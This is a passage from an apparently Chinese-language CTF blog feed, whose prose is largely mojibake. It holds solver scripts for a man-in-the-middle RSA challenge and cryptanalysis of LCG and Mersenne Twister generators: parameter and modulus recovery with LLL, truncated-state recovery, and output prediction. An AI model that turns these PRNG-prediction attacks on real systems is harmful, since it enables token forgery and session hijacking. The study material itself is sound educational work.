class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> p0 &gt; <span class="number">1</span> <span class="keyword">and</span> n % p0 == <span class="number">0</span>:</span><br><span class="line">                q = int(p0)</span><br><span class="line">                state = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            daemon_thread = threading.Thread(target=partial_p, args=(p0,kbits,n,), daemon=<span class="literal">True</span>)</span><br><span class="line">            daemon_thread.start()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    encrypted_flag = get_encrypted_flag()</span><br><span class="line">    (e, n, d0) = gen_RSA_key()</span><br><span class="line">    (cipherC, cipherS) = MITM_connect()</span><br><span class="line">    c = MITM_conversation(cipherC, cipherS)</span><br><span class="line">    print(<span class="string">"RSA_enc_key:"</span>, c)</span><br><span class="line">    d0 = Integer(d0)</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    find_p(d0, kbits, e, n)</span><br><span class="line">    p = n // q</span><br><span class="line">    d = inverse(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    print(<span class="string">"[+] d = &#123;&#125;"</span>.format(d))</span><br><span class="line">    key = long_to_bytes(pow(c, d, n))</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    print(aes.decrypt(encrypted_flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>$size(e)=10$ï¼Œä¹Ÿå¯èƒ½æ˜¯è™šæ‹Ÿæœºé‡Œè·‘sageä¸å¤ªå¯ï¼Œè„šæœ¬è·‘çš„æ—¶é—´çœ‹äººå“-.-</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aurora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(PRNG)</title>
      <link href="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/"/>
      <url>/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/</url>
      
        <content type="html"><![CDATA[<h3 id="LCG-Basis"><a href="#LCG-Basis" class="headerlink" title="LCG - Basis"></a>LCG - Basis</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><p>[å‰ç½®çŸ¥è¯†]</p><p>$S_{n+1}\equiv aS_{n}+b(mod\ m)$ï¼Œ$S_{0}$ä¸ºå¯¹åº”ç§å­.</p><p>åœ¨$F_{m}$ä¸Šï¼ˆmå–å¤§ç´ æ•°ï¼‰ï¼Œè‹¥$gcd(a,m)=1$ï¼Œåˆ™å‘¨æœŸ$T=ord_{m}(a)$.</p><p>æ‰€ä»¥é€‰å–ç³»æ•°æ—¶åº”å°½é‡ä½¿å¾—aä¸ºæ¨¡mçš„åŸæ ¹ï¼Œä»¥æ­¤å°½é‡å»¶é•¿LCGå‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè¦é¿å…$S_{0}=S_{bad}$.</p><h3 id="LCG-Unknown-a-b"><a href="#LCG-Unknown-a-b" class="headerlink" title="LCG - Unknown (a, b)"></a>LCG - Unknown (a, b)</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><p>$S_{n+1}\equiv aS_{n}+b(mod\ m)$ï¼Œ(a, b)æœªçŸ¥ï¼Œmå·²çŸ¥.</p><p>åˆ™åªè¦ç»™å‡ºè¿ç»­ä¸‰ä¸ªç”Ÿæˆå€¼$s_{0},s_{1},s_{2}$å³å¯æ±‚è§£ï¼ˆç­‰ä»·äºç»™å‡ºä¸¤ä¸ª$F_{m}$ä¸Šçš„æ¨¡æ–¹ç¨‹ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/Snipaste_2020-03-30_22-12-02.png" alt></p><p>è™½ç„¶æ±‚è§£ä¸Šè¿°æ–¹ç¨‹ç»„å¾ˆå®¹æ˜“ï¼Œä½†è¿™é‡Œä»‹ç»ä¸€ç»„æ±‚æ¨¡ç­‰å¼æ–¹ç¨‹ç»„çš„é€šæ³•.</p><p>è¯¥æ–¹æ³•åŸºäºLLLï¼Œå¯¹æ„é€ çš„æ ¼åŸºè¿›è¡Œçº¦åŒ–.</p><p>e.g. å¯¹ä¸Šè¿°æ–¹ç¨‹ç»„æ„é€ å¦‚ä¸‹çŸ©é˜µï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/Snipaste_2020-03-30_22-30-12.png" alt></p><p>æˆ‘ä»¬å¸Œæœ›æ ¼åŸºçº¦åŒ–åèƒ½å¾—åˆ°ä¸€ä¸ªè¡Œå‘é‡ï¼Œæ»¡è¶³å‰ä¸¤ä¸ªå…ƒç´ ä¸º0.</p><p>ä¸”ä¸ºäº†åœ¨çº¦åŒ–åçš„çŸ©é˜µä¸­å¾—åˆ°ç›´è§‚çš„a, bï¼Œé‚»æ¥ä¸Šä¸€ä¸ª$\frac{E}{m}$ï¼ˆè¿™é‡Œä¸ç”¨å•ä½çŸ©é˜µEçš„åŸå› ï¼Œæ˜¯å› ä¸ºæœ€å¥½ä½¿å¾—åŒ…å«a(-a),b(-b)çš„è¡Œå‘é‡çš„é•¿åº¦å°½å¯èƒ½çŸ­ï¼Œä¹Ÿå°±æ˜¯è¯´æ›´å¤§çš„åˆ†æ¯ä¹Ÿæ˜¯å…è®¸çš„ï¼‰.</p><p>åœ¨LLLçº¦åŒ–åï¼Œåªè¦æ‰¾åˆ°æ»¡è¶³ä¸‹åˆ—è¦æ±‚çš„è¡Œå‘é‡rï¼Œå³æ±‚è§£æˆåŠŸï¼š</p><ul><li>r[0] = r[1] = 0</li><li>r[-1] = 1(-1)</li></ul><p>$\rightarrow m\cdot r[2]=a(-a),m\cdot r[3]=b(-b)$. </p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix([</span><br><span class="line">    [s0  ,s1  ,<span class="number">1</span>/m ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">    [<span class="number">1</span>   ,<span class="number">1</span>   ,<span class="number">0</span>   ,<span class="number">1</span>/m ,<span class="number">0</span>   ],</span><br><span class="line">    [-s1 ,-s2 ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">1</span>   ],</span><br><span class="line">    [m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">    [<span class="number">0</span>   ,m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ]</span><br><span class="line">])</span><br><span class="line">A = A.LLL()</span><br><span class="line">a = <span class="literal">None</span></span><br><span class="line">b = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">if</span> l[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> l[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">            a, b = l[<span class="number">2</span>] * m, l[<span class="number">3</span>] * m</span><br><span class="line">        <span class="keyword">elif</span> l[<span class="number">-1</span>] == <span class="number">-1</span>:</span><br><span class="line">            a, b = -l[<span class="number">2</span>] * m, -l[<span class="number">3</span>] * m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">or</span> <span class="keyword">not</span> b:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"[*] No solves"</span>)</span><br><span class="line">a %= m</span><br><span class="line">b %= m</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>æ„é€ çŸ©é˜µè¿›è¡ŒLLLçº¦åŒ–æ˜¯åœ¨è§£å†³æ¨¡ç­‰å¼å’ŒCVPç­‰é—®é¢˜æ—¶å¾ˆå®ç”¨çš„æ–¹æ³•ï¼Œåº”ç†Ÿç»ƒæŒæ¡.</p><h3 id="LCG-Unknown-a-b-m"><a href="#LCG-Unknown-a-b-m" class="headerlink" title="LCG - Unknown (a, b, m)"></a>LCG - Unknown (a, b, m)</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><p>åœ¨ä¹˜æ•°ï¼Œå¢é‡å’Œæ¨¡æ•°å‡æœªçŸ¥æ—¶ï¼Œå¯¹ä»»æ„Nï¼Œç”±å–å¾—çš„è¿ç»­Nä¸ªæ•°æ®æ„æˆçš„Nä¸ªæ¨¡æ–¹ç¨‹å‡æœ‰N+3ä¸ªæœªçŸ¥å…ƒ. å› æ­¤ä¸èƒ½ä»¥ä¸Šè¿°æ–¹æ³•æ±‚è§£ï¼Œå› æ­¤ç”¨ä¸‹è¿°æ–¹æ³•è¿›è¡ŒModule_crack.</p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ç»„æ•°æ®data = $\{k_{i}N\}$(Nä¸ºå¤§ç´ æ•°ï¼Œ$k_{i}$ä¸º$F_{N}$ä¸‹çš„éšæœºæ•°)ï¼Œåˆ™reduce(GCD, data)å¾ˆå¤§æ¦‚ç‡å³ä¸ºNæˆ–Nä¹˜ä¸Šä¸€äº›å¾ˆå°çš„å› å­.ï¼ˆ$\because$ å‡è®¾len(data)=nï¼Œåˆ™åœ¨$k_{i}$è§†ä½œå®Œå…¨éšæœºçš„æƒ…å†µä¸‹ï¼Œreduce(GCD, data)æœ‰é™¤Nå¤–çš„ç´ å› å­pçš„æ¦‚ç‡çº¦ä¸º$\frac{1}{p^{n}}$ï¼Œ$\therefore$ åœ¨pæˆ–nè¶³å¤Ÿå¤§çš„æ—¶å€™è¯¥æ–¹æ³•èƒ½æœ‰æ•ˆæ±‚è§£Nï¼‰</p><p>å¼•å…¥åºåˆ—$T_{n}=S_{n+1}-S_{n}$</p><p>$T_{n+1}=S_{n+2}-S_{n+1}=a(S_{n+1}-S_{n})=aT_{n}(mod\ m)$</p><p>$T_{n+2}=S_{n+3}-S_{n+2}=a(S_{n+2}-S_{n+1})=aT_{n+1}=a^{2}T_{n}(mod\ m)$</p><p>$\therefore T_{n}T_{n+2}-T_{n+1}^{2}=0(mod\ m)$</p><p>å› æ­¤åªè¦æˆ‘ä»¬èƒ½æ‹¿åˆ°è¿ç»­$n(n\geq 6)$ç»„æ•°æ®ï¼Œå³å¯å¯¹moduleè¿›è¡Œæœ‰æ•ˆæ”»å‡». åç»­å³è½¬ä¸ºä¸Šä¸€ä¸ªæƒ…å½¢çš„LCGæ”»å‡». </p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[1]:</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[2]:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        m = getPrime(<span class="number">256</span>)</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        b = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        seed = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        self._key = &#123;<span class="string">'a'</span>:a, <span class="string">'b'</span>:b, <span class="string">'m'</span>:m&#125;</span><br><span class="line">        self._state = seed</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._state = (self._key[<span class="string">'a'</span>] * self._state + self._key[<span class="string">'b'</span>]) % self._key[<span class="string">'m'</span>]</span><br><span class="line">        <span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export_key</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._key</span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[3]:</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    data.append(prng.next())</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">delta = [d1 - d0 <span class="keyword">for</span> (d0, d1) <span class="keyword">in</span> zip(data, data[<span class="number">1</span>:])]</span><br><span class="line">m_mul = [d0 * d2 - d1 * d1 <span class="keyword">for</span> (d0, d1, d2) <span class="keyword">in</span> zip(delta, delta[<span class="number">1</span>:], delta[<span class="number">2</span>:])]</span><br><span class="line">m = reduce(GCD, m_mul)</span><br><span class="line">factors = factor(m)</span><br><span class="line"><span class="keyword">if</span> len(factors) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> (prime, degree) <span class="keyword">in</span> factors:</span><br><span class="line">        <span class="keyword">if</span> size(prime) == <span class="number">256</span>:</span><br><span class="line">            m = prime</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        m //= (prime**degree)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jump to Unknown (a, b) case</span></span><br></pre></td></tr></table></figure><h4 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h4><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/" target="_blank" rel="noopener">https://tailcall.net/blog/cracking-randomness-lcgs/</a></p><h3 id="LCG-Truncated-Given-a-b-m"><a href="#LCG-Truncated-Given-a-b-m" class="headerlink" title="LCG - Truncated (Given a, b, m)"></a>LCG - Truncated (Given a, b, m)</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><p>Truncated LCGå¯ä»¥è¡¨ç¤ºå¦‚ä¸‹:</p><p>$x_{i}=2^{\beta\cdot size(m)}y_{i}+z_{i}$ï¼Œ$\beta$ä¸ºdiscarded bitsçš„æ¯”ä¾‹å› å­ï¼Œä½¿ç”¨çš„éšæœºæ•°æµä»…ä¸º$y_{i}s$ï¼Œåœ¨ç»™å‡ºéƒ¨åˆ†è¿ç»­$y_{i}$å’Œ(a, b, m)çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬èƒ½æœ‰æ•ˆæ¢å¤å‡º$z_{i}$ï¼Œä»è€Œé¢„æµ‹æ¥ä¸‹æ¥çš„éšæœºæ•°æµ.</p><p>é¦–å…ˆè®¨è®ºä¸€ç±»æ±‚è§£æ¨¡ç­‰å¼ç»„çš„é—®é¢˜ï¼Œå¯ä»¥è¡¨ç¤ºä¸º</p><script type="math/tex; mode=display">\sum^{k}_{j=1}a_{ij}x_{j}=c_{i}(mod\ M),i\in\{1,...,k\}</script><p>å¦‚æœæ­¤æ—¶æˆ‘ä»¬å¯¹ç³»æ•°çŸ©é˜µAè¿›è¡Œæ ¼åŸºçº¦åŒ–ï¼Œå³AL=LLL(A)ï¼Œåˆ™</p><script type="math/tex; mode=display">\sum^{k}_{j=1}a'_{ij}x_{j}=c'_{i}(mod\ M)\\C'=A.solve\_left(AL)\cdot C</script><p>å› ä¸ºALä¸ºçº¦ç®€åŸºï¼Œæ‰€ä»¥ä¹ŸåŒæ—¶æœ‰æ•ˆå‡å°$k_{i}(Mk_{i}+c_{i}=\sum^{k}_{j=1}a_{ij}x_{j})$.ï¼ˆçº¦åŒ–åå¯è§†ä½œ$k\rightarrow k_{min}$ï¼‰</p><p>ä»¤$delta_X=[x_{1}-x_{0},x_{2}-x_{1},â€¦,x_{n}-x_{n-1}]^{T}$</p><p>$delta_Y=[2^{\beta\cdot size(m)}(y_{1}-y_{0}),2^{\beta\cdot size(m)}(y_{2}-y_{1}),â€¦,2^{\beta\cdot size(m)}(y_{n}-y_{n-1})]^{T}$</p><p>$delta_Z=[z_{1}-z_{0},z_{2}-z_{1},â€¦,z_{n}-z_{n-1}]$</p><p>$\because x_{i+1}-x_{i}=a^{i}(x_{1}-x_{0})\quad(mod\ m)$</p><p>$\therefore$ æ„é€ çŸ©é˜µAå¦‚ä¸‹</p><script type="math/tex; mode=display">\left[\begin{matrix}m & 0 & 0 & ... & 0\\a & -1 & 0 & ... & 0\\a^{2} & 0 & -1 & ... & 0\\... & ... & ... & ... & ...\\a^{n} & 0 & 0 & ... & -1\end{matrix}\right]</script><p>$A\cdot delta_X=0(mod\ m),AL=LLL(A)$</p><p>$AL\cdot delta_X=0(mod\ m),AL\cdot delta_X=m\cdot [k_{0},â€¦,k_{n-1}]^{T}$</p><p>$AL\cdot(delta_Y+delta_Z)=m\cdot [k_{0},â€¦,k_{n-1}]^{T}$</p><p>åˆ™æ­¤æ—¶æ»¡è¶³ï¼š$k\rightarrow k_{min}$ï¼Œå› ä¸ºdelta_ZæœªçŸ¥ï¼Œæˆ‘ä»¬åªèƒ½åˆ©ç”¨delta_Yè¿›è¡Œä¼°å€¼ï¼Œå¯ä»¥åšä¸ªç²—ç•¥ä¼°è®¡</p><p>ALä¸­æ¯ä¸ªå…ƒå¤§å°è¿‘ä¼¼å–ä½œ$det(AL)^{\frac{1}{n}}=m^{\frac{1}{n}}$ï¼Œè€Œ$size(delta_Z[i])\leq\beta\cdot size(m)$ï¼Œå› æ­¤</p><p>$nm^{\frac{1}{n}}2^{\beta\cdot size(m)}&lt;m\Rightarrow$ åœ¨mè¶³å¤Ÿå¤§æ—¶ï¼Œnå¯å¿½ç•¥ä¸è®¡ï¼ˆä¸€èˆ¬å–10å³å¯ï¼‰ï¼Œå³$\beta&lt;\frac{n-1}{n}$</p><p>åœ¨ä¸Šè¿°æ¡ä»¶æ»¡è¶³æ—¶ï¼Œå¯è§†ä½œ$AL\cdot delta_Z&lt;|m|$ï¼ˆä½†åªæ˜¯å¤§è‡´ä¼°è®¡ï¼‰</p><p>å› æ­¤$k_{i}=round((AL\cdot delta_Y)_{i}/m)$ï¼Œæ±‚å¾—$k_{i}$åï¼Œ$delta_Z=AL.solve_right(mk-AL\cdot delta_Y)$ï¼Œdelta_Xè·çŸ¥ï¼Œå³å¯æ¨å‡ºç§å­ç ´è§£æ•´ä¸ªtruncated LCG.</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[4]:</span></span><br><span class="line">prng = LCG(<span class="number">128</span>)</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    data.append(prng.next())</span><br><span class="line">leak_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    leak_data.append(data[i] - data[i] % <span class="number">2</span>^<span class="number">48</span>)</span><br><span class="line">print(prng.export_key())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[29]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(seed, a, b, m)</span>:</span></span><br><span class="line">    x = seed % m</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (a * x + b) % m</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[51]:</span></span><br><span class="line">a = <span class="number">94105412428421315937226606524092193902</span></span><br><span class="line">b = <span class="number">272271222013811783094314393442542793059</span></span><br><span class="line">m = <span class="number">335812331024081385414724338959789210621</span></span><br><span class="line">A = Matrix(ZZ, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">A[<span class="number">0</span>, <span class="number">0</span>] = m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    A[i, <span class="number">0</span>] = a^i</span><br><span class="line">    A[i, i] = <span class="number">-1</span></span><br><span class="line">AL = A.LLL()</span><br><span class="line">delta_Y = vector([leak_data[i + <span class="number">1</span>] - leak_data[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">W1 = AL * delta_Y</span><br><span class="line">W2 = vector([round(RR(w) / m) * m - w <span class="keyword">for</span> w <span class="keyword">in</span> W1])</span><br><span class="line">delta_Z = AL.solve_right(W2)</span><br><span class="line">delta_X = delta_Y + delta_Z</span><br><span class="line">x0 = (inverse(a - <span class="number">1</span>, m) * (delta_X[<span class="number">0</span>] - b)) % m</span><br><span class="line">rand_iter = lcg(x0, a, b, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    x = next(rand_iter)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h4><p><a href="https://www.math.cmu.edu/~af1p/Texfiles/RECONTRUNC.pdf" target="_blank" rel="noopener">https://www.math.cmu.edu/~af1p/Texfiles/RECONTRUNC.pdf</a></p><p>javaçš„nextIntå³é€‚ç”¨è¯¥ç§LCGæ”»å‡»æ¨¡å¼ï¼Œä½†ç½‘ä¸Šå¤šé€‰æ‹©ç©·ä¸¾ï¼ˆå› ä¸ºdiscard bitsæ‰åªæœ‰$2^{16}$ï¼Œæš´åŠ›æ›´çœäº‹-.-ï¼‰</p><h3 id="MT-Predict-Backtrace"><a href="#MT-Predict-Backtrace" class="headerlink" title="MT - Predict/Backtrace"></a>MT - Predict/Backtrace</h3><h4 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h4><p>Mersenne Twisterä¹Ÿæ˜¯ä¸€ç§æµè¡Œçš„PRNGç®—æ³•ï¼Œåœ¨pythonçš„random.getrandbitså’Œphpçš„mt_randä¸­å‡æœ‰ä½¿ç”¨</p><p>MTç®—æ³•æœ‰624ä¸ª32bitsé•¿çš„stateï¼Œæ–°ä¸€è½®æ›´æ–°stateçš„ç®—æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] state;</span><br><span class="line"><span class="comment">// Iterate through the state</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">624</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// y is the first bit of the current number,</span></span><br><span class="line">  <span class="comment">// and the last 31 bits of the next number</span></span><br><span class="line">  <span class="keyword">int</span> y = (state[i] &amp; <span class="number">0x80000000</span>) + (state[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">  <span class="comment">// first bitshift y by 1 to the right</span></span><br><span class="line">  <span class="keyword">int</span> next = y &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// xor it with the 397th next number</span></span><br><span class="line">  next ^= state[(i + <span class="number">397</span>) % <span class="number">624</span>];</span><br><span class="line">  <span class="comment">// if y is odd, xor with magic number</span></span><br><span class="line">  <span class="keyword">if</span> ((y &amp; <span class="number">1L</span>) == <span class="number">1L</span>) &#123;</span><br><span class="line">    next ^= <span class="number">0x9908b0df</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// now we have the result</span></span><br><span class="line">  state[i] = next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»æ¯ä¸ªstateç”Ÿæˆç­‰é•¿(32bits)çš„éšæœºæ•°çš„ç®—æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">currentIndex++;</span><br><span class="line"><span class="keyword">int</span> tmp = state[currentIndex];</span><br><span class="line">tmp ^= (tmp &gt;&gt;&gt; <span class="number">11</span>);</span><br><span class="line">tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>;</span><br><span class="line">tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>;</span><br><span class="line">tmp ^= (tmp &gt;&gt;&gt; <span class="number">18</span>);</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br></pre></td></tr></table></figure><p>è¦ç ´è§£MTç®—æ³•ï¼Œå…ˆå†³æ¡ä»¶æ˜¯è¦leakè‡³å°‘624ä¸ªè¿ç»­éšæœºæ•°(32bits)ï¼Œæˆ–æ˜¯è¯´è‡³å°‘è¿ç»­624*32bitsäºŒè¿›åˆ¶æµ</p><ul><li><p>Step 1(ä»éšæœºæ•°æ¢å¤state)</p><p>å…·ä½“å®ç°å‡½æ•°unBitshiftRightXorå’ŒunBitshiftLeftXoråœ¨expä¸­å·²ç»™å‡ºï¼Œå…·ä½“åŸç†è¾ƒå®¹æ˜“æ¨å‡ºï¼Œä¸åœ¨æ­¤èµ˜è¿°</p></li><li><p>Step 2(é¢„æµ‹/å›æº¯)</p><p>é¢„æµ‹å³æ­£å¸¸ç”Ÿæˆæ–°çš„stateå³å¯</p><p>å›æº¯stateåˆ™ä»state[623]å¼€å§‹ï¼ˆå› ä¸ºnew_state[623]å’Œ(old_state[623],new_state[0],new_state[396])æœ‰å…³ï¼Œä¸”å”¯ä¸€æœªçŸ¥çš„å³ä¸ºold_state[623]ï¼‰ï¼Œå›æº¯å¾—åˆ°old_state[623]åï¼ŒåŒç†å‘å‰æ¨å³å¯</p></li></ul><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 